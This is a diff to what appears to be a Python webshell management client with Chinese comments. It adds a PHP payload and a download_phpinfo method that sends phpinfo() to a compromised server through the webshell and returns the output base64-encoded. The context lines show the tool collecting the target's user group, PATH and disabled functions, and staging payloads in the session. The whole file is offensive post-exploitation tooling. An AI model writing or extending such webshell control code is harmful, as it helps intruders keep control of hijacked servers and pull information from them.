@@ -9,7 +9,7 @@ import re
 import string
 import typing as t
 from dataclasses import dataclass
-
+from binascii import Error as BinasciiError
 import httpx
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
@@ -133,6 +133,14 @@ array_push($infos, [
 echo json_encode($infos);
 """
 
+DOWNLOAD_PHPINFO_PHP = """
+ob_start();
+phpinfo();
+$content = ob_get_contents();
+ob_end_clean();
+echo base64_encode($content);
+"""
+
 PAYLOAD_SESSIONIZE = """
 $b64_part = 'B64_PART';
 if(!$_SESSION['PAYLOAD_STORE']) {
@@ -185,7 +193,7 @@ basic_info_names = {
     "SERVER_GROUP": "用户所在组",
     "ENV_PATH": "环境变量PATH",
     "INI_DISABLED_FUNCTIONS": "disabled_functions",
-    "EXTENSIONS": "PHP扩展"
+    "EXTENSIONS": "PHP扩展",
 }
 
 
@@ -353,6 +361,14 @@ class PHPWebshell(PHPSessionInterface):
             return result
         except json.JSONDecodeError as exc:
             raise exceptions.UnexpectedError("解析目标返回的JSON失败") from exc
+
+    async def download_phpinfo(self) -> bytes:
+        """获取当前的phpinfo文件"""
+        b64_result = await self.submit(DOWNLOAD_PHPINFO_PHP)
+        try:
+            return base64.b64decode(b64_result)
+        except BinasciiError as exc:
+            raise exceptions.UnexpectedError("base64解码接收到的数据失败") from exc
 
     async def _submit(self, payload: str) -> str:
         """将php payload通过encoder编码后提交"""
